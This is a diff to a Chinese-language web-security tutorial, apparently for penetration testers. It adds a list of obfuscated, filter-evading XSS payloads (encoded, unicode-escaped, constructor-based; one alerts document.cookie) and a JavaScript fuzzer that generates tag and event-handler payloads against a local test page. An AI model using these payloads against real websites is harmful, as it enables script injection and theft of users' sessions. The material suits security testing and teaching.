@@ -246,3 +246,49 @@ ontimeupdate
 onvolumechange
 onwaiting
 ```
+#### [SAVE_PAYLOAD]可执行代码
+- - -
+这个看自己收集和构造的，编码拆分组合拼接各种骚操作都可以。
+```
+setTimeout`alert(1)`
+atob.constructor(atob`YWxlcnQoMSk=`)``
+Set.constructor`al\x65rt\x28/xss/\x29```
+top[alt%2blang]`0` alt=al lang=ert
+"a(this);function a()(alert(document.cookie))"
+"javascript:window.onerror=alert;throw 1"
+"javascript:window.onerror=prompt;throw 2"
+"\u006aavascript:\u0077indow.onerror=\u0070rompt;throw 3"
+"\u006aavascript:\u0077indow.\u006fndblclick=\u0070rompt;"
+"\u006aavascript:\u0077indow.\u006fnkeydown=\u0070rompt;"
+"\u006aavascript:\u0077indow.\u006fnkeypress=\u0070rompt;"
+"\u006aavascript:\u0077indow.\u006fnmousemove=\u0070rompt;"
+"\u006aavascript:\u0077indow.\u006fnkeyup=\u0070rompt;"
+location='javascript:/*'%2blocation.hash> #*/alert(1) 
+....等
+```
+
+#### 构造payload
+- - -
+有了上面的准备，我们可以构造出大量xss_payload。
+![11.png](https://ae01.alicdn.com/kf/U10bdd4be267e44c99f795032ea6ec32af.png)
+
+也可以利用key师傅这个js脚本，优点很明显能直接弹框的，脚本自己修改下就行。
+```
+var i,j,k,xss,f=0;
+var ons = ["onload","onerror"];
+var labs = ["a","b","q","br","dd","dl","dt","h1","del","abbr","video","base","audio","details"];
+var hexs= ["%09","%00","%0d","%0a"];
+for(i=0;i<labs.length;i++){
+    for(j=0;j<hexs.length;j++){
+        for(k=0;k<ons.length;k++){
+            xss = f+'<'+labs[i]+hexs[j]+ons[k]+"=alert("+f+") src=a>a";
+            var body = document.getElementsByTagName("body");
+            var div = document.createElement("div");
+            div.innerHTML = f+"<iframe src=\"http://127.0.0.1/index.php?fuzz="+xss+"\"></iframe>";
+            document.body.appendChild(div);
+            f = f+1;
+        }
+    }
+}
+```
+其他脚本可以去Github寻找，这样收集构造出属于自己的xss_payload.txt 测试时直接fuzz看结果，再根据结果进一步fuzz。
